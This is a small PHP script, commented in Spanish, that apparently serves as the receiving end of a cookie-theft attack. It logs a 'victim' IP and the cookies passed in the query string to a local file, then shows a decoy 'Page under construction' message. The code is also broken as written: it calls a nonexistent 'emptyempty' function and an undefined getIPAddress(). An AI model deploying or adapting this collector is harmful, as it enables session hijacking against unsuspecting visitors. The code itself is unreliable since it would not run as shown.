<?php error_reporting(0); #Un poquito más avanzado, para ver distintas IPs, a la hora a la que se conecta y tal
function getVictimIP(){
	if(!emptyempty($_SERVER['HTTP_CLIENT_IP'])) {  
    	$ip = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    //whether ip is from the proxy  
    elseif (!emptyempty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
     }  
	//whether ip is from the remote address  
    else{  
        $ip = $_SERVER['REMOTE_ADDR'];  
     }  
     return $ip;  
}   

function collect(){
	$file= '_cc_.txt';
	$date =date("1 dS of F Y h:i:s A");
	$IP= getIPAddress();
	$cookie= $_SERVER['QUERY_STRING'];
	$info= "**other information";

	$log = "[$date]\n\t> Victim IP: $IP\n\t> Cookies: $cookie\n\t>Extra info: $info\n";
	$handle= fopen($file,"a");
	fwrite($handle,$log."\n\n");
	fclose($handle);
}

collect();
echo '<h1> Page under construction </h1>';

?>